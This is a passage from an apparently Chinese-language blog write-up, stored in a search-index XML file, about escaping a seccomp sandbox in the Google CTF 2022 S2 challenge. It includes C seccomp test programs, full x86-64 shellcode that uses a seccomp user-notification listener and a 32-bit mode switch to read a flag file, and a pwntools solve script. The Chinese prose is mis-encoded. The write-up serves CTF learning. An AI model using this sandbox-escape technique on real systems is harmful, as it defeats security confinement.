__NR_seccomp, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog2 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter2) / <span class="built_in">sizeof</span>(strict_filter2[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter2,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_prctl,PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog2);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_write,<span class="number">1</span>,<span class="string">&quot;1\n&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter3[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog3 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter3) / <span class="built_in">sizeof</span>(strict_filter3[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter3,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog3);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_write,<span class="number">1</span>,<span class="string">&quot;2\n&quot;</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<p><img src="/img/seccomp_ctf/1-2.png"></p>
<p>å¦‚ä¸‹æµ‹è¯•æ˜¯å…ˆç¦æ­¢ write å†å…è®¸ï¼š</p>
<details class="note "><summary><p>æµ‹è¯•æºç </p>
</summary>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter2[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_seccomp, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog2 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter2) / <span class="built_in">sizeof</span>(strict_filter2[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter2,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_prctl,PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter3[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog3 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter3) / <span class="built_in">sizeof</span>(strict_filter3[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter3,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog3);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_write,<span class="number">1</span>,<span class="string">&quot;2\n&quot;</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<p><img src="/img/seccomp_ctf/1-3.png"></p>
<p>å›åˆ°é¢˜ç›®ä¸­å¯ä»¥å‘ç°ï¼Œé¢˜ç›®æ²¡æœ‰è§„åˆ™ç¦æ­¢äº† x86 çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ install ä¸€ä¸ª SECCOMP_FILTER_FLAG_NEW_LISTENER ç›‘æµ‹è°ƒç”¨ 32 ä½çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå‡†å¤‡è°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨è¿”å› SECCOMP_RET_USER_NOTIFï¼Œflag ç½® SECCOMP_USER_NOTIF_FLAG_CONTINUEï¼›å­è¿›ç¨‹åˆ‡æ¢åˆ° 32 ä½ï¼Œæ‰§è¡Œ orwã€‚</p>
<p>install seccompï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter:</span><br><span class="line">    dq 0x400000020</span><br><span class="line">    dq 0x4000000300010015</span><br><span class="line">    dq 0x7fff000000000006</span><br><span class="line">    dq 0x20</span><br><span class="line">    dq 0x501000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x301000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x401000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x7fff000000000006</span><br></pre></td></tr></table></figure>

<p><img src="/img/seccomp_ctf/1-4.png"></p>
<p>ç³»ç»Ÿè°ƒç”¨345å¯¹åº”32ä½çš„ orwã€‚</p>
<p>å®Œæ•´çš„ expï¼ˆæ¥è‡ª ptr-yudaiï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">%define SYS_ioctl   16</span><br><span class="line">%define SYS_seccomp 317</span><br><span class="line">%define SYS_fork    57</span><br><span class="line">%define SYS_exit    60</span><br><span class="line">%define SYS_execveat    0x142</span><br><span class="line">%define SECCOMP_USER_NOTIF_FLAG_CONTINUE    1</span><br><span class="line">%define SECCOMP_IOCTL_NOTIF_RECV 3226476800</span><br><span class="line">%define SECCOMP_IOCTL_NOTIF_SEND 3222806785</span><br><span class="line"></span><br><span class="line">    ; r15 = notifyFd</span><br><span class="line">_start:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line"></span><br><span class="line">    lea rax, [filter]</span><br><span class="line">    mov [prog_filter], rax</span><br><span class="line"></span><br><span class="line">    lea rdx, [prog]</span><br><span class="line">    mov esi, 8                          ; SECCOMP_FILTER_FLAG_NEW_LISTENER</span><br><span class="line">    mov edi, 1                          ; SECCOMP_SET_MODE_FILTER</span><br><span class="line">    mov eax, SYS_seccomp                </span><br><span class="line">    syscall</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail</span><br><span class="line">    mov r15d, eax</span><br><span class="line"></span><br><span class="line">    mov eax, SYS_fork</span><br><span class="line">    syscall</span><br><span class="line">    test eax, eax</span><br><span class="line">    jz childProcess</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line">;; SUPERVISOR</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">parentProcess:</span><br><span class="line">    ; memset(req, 0, 0x1000)</span><br><span class="line">    mov ecx, 0x1000</span><br><span class="line">    xor eax, eax</span><br><span class="line">    lea rdi, [req]</span><br><span class="line">    rep stosb</span><br><span class="line">    ; memset(resp, 0, 0x1000)</span><br><span class="line">    mov ecx, 0x1000</span><br><span class="line">    xor eax, eax</span><br><span class="line">    lea rdi, [resp]</span><br><span class="line">    rep stosb</span><br><span class="line"></span><br><span class="line">    ; ioctl(nfd, SECCOMP_IOCTL_NOTIF_RECV, &amp;req)</span><br><span class="line">    lea rdx, [req]</span><br><span class="line">    mov esi, SECCOMP_IOCTL_NOTIF_RECV</span><br><span class="line">    mov edi, r15d</span><br><span class="line">    mov eax, SYS_ioctl</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; resp-&gt;id = req-&gt;id</span><br><span class="line">    mov rax, [req]</span><br><span class="line">    mov [resp], rax</span><br><span class="line">    ; resp-&gt;flag = SECCOMP_USER_NOTIF_FLAG_CONTINUE</span><br><span class="line">    mov dword [resp+0x14], SECCOMP_USER_NOTIF_FLAG_CONTINUE</span><br><span class="line"></span><br><span class="line">    ; ioctl(nfd, SECCOMP_IOCTL_NOTIF_SEND, &amp;resp)</span><br><span class="line">    lea edx, [resp]</span><br><span class="line">    mov esi, SECCOMP_IOCTL_NOTIF_SEND</span><br><span class="line">    mov edi, r15d</span><br><span class="line">    mov eax, SYS_ioctl</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp parentProcess</span><br><span class="line"></span><br><span class="line">;; </span><br><span class="line">;; childProcess åˆ‡æ¢åˆ° 32 ä½</span><br><span class="line">;;</span><br><span class="line">childProcess:</span><br><span class="line">    mov esp, 0x410000</span><br><span class="line">    mov DWORD [esp+4], 0x23</span><br><span class="line">    lea rax, [mode32]</span><br><span class="line">    mov DWORD [esp], eax</span><br><span class="line">    retf</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    mov eax, 59</span><br><span class="line">    syscall</span><br><span class="line">    hlt</span><br><span class="line"></span><br><span class="line">BITS 32</span><br><span class="line">mode32:</span><br><span class="line">    call s_filename</span><br><span class="line">    db &quot;./flag&quot;, 0</span><br><span class="line"></span><br><span class="line">s_filename:</span><br><span class="line">    mov ecx, 0</span><br><span class="line">    pop ebx			</span><br><span class="line">    mov eax, 5</span><br><span class="line">    int 0x80			// open(&quot;./flag&quot;, 0)</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail32</span><br><span class="line"></span><br><span class="line">    mov edx, 0x100</span><br><span class="line">    mov ecx, 0x401000</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov eax, 3</span><br><span class="line">    int 0x80</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail32</span><br><span class="line"></span><br><span class="line">    mov edx, 0x100</span><br><span class="line">    mov ecx, 0x401000</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    js fail32</span><br><span class="line"></span><br><span class="line">b:</span><br><span class="line">    jmp b</span><br><span class="line"></span><br><span class="line">fail32:</span><br><span class="line">    mov eax, 50</span><br><span class="line">    int 0x80</span><br><span class="line">    hlt</span><br><span class="line"></span><br><span class="line">prog:</span><br><span class="line">    dq 11</span><br><span class="line"></span><br><span class="line">prog_filter:</span><br><span class="line">    dq 0</span><br><span class="line"></span><br><span class="line">filter:</span><br><span class="line">    dq 0x400000020</span><br><span class="line">    dq 0x4000000300010015</span><br><span class="line">    dq 0x7fff000000000006</span><br><span class="line">    dq 0x20</span><br><span class="line">    dq 0x501000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x301000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x401000015</span><br><span class="line">    dq 0x7fc0000000000006</span><br><span class="line">    dq 0x7fff000000000006</span><br><span class="line"></span><br><span class="line">req:</span><br><span class="line">    times 0x1000 dq 0</span><br><span class="line">resp:</span><br><span class="line">    times 0x1000 dq 0</span><br><span class="line"></span><br><span class="line">section .bss</span><br><span class="line">    resb 0x10000</span><br></pre></td></tr></table></figure>

<p>solve.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level=<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.system(<span class="string">&quot;nasm shellcode.S -g -F dwarf -fELF64&quot;</span>):</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> os.system(<span class="string">&quot;ld shellcode.o --omagic&quot;</span>):</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">if os.system(&quot;nasm shellcode32.S -fELF32&quot;):</span></span><br><span class="line"><span class="string">    exit(1)</span></span><br><span class="line"><span class="string">if os.system(&quot;ld shellcode32.o -melf_i386&quot;):</span></span><br><span class="line"><span class="string">    exit(1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.out&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    buf = f.read()</span><br><span class="line"></span><br><span class="line">sock = Process(<span class="string">&quot;./chal&quot;</span>)</span><br><span class="line"><span class="comment"># sock = Socket(&quot;s2.2022.ctfcompetition.com 1337&quot;)</span></span><br><span class="line"></span><br><span class="line">sock.send(p64(<span class="built_in">len</span>(buf)))</span><br><span class="line">sock.send(buf)</span><br><span class="line"></span><br><span class="line">sock.sh()</span><br></pre></td></tr></table></figure>

<p><img src="/img/seccomp_ctf/1-5.png"></p>
<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><ol>
<li><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">seccomp(2) - Linux manual page (man7.org)</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=bpf&sektion=4&manpath=FreeBSD+4.7-RELEASE">bpf(4) (freebsd.org)</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/seccomp_unotify.2.html">seccomp_unotify(2) - Linux manual page (man7.org)</a></li>
<li><a href="https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html">Guide-of-Seccomp-in-CTF | n132</a></li>
<li><a href="https://n132.github.io/2022/07/04/S2.html">Google CTF 2022 S2: Escape from Googleâ€™s Monitoring | n132</a></li>
</ol>
]]></content>
      <categories>
        <category>çŸ¥è¯†å­¦ä¹ </category>
        <category>é¢˜ç›®å¤ç°</category>
      </categories>
      <tags>
        <tag>seccomp</tag>
        <tag>sanbox</tag>
      </tags>
  </entry>
</search>
